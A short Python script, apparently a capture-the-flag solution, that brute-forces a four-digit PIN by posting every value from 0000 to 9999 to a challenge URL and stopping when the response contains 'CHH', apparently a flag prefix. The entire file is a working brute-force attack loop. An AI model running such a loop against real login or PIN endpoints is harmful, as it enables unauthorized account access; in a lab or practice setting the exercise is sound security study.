import requests

url = "https://baby-logic-pincode-81984935.dailycookie.cloud"

for i in range(10000):
    data = {"pin": f"{i:0{4}}" }  # Tạo dữ liệu POST với tham số tương ứng
    response = requests.post(url, data=data)
    print(f"{url} : with pin {i:0{4}}")
    if "CHH" in response.text:
        print("Found CHH in response. Exiting.")
        break
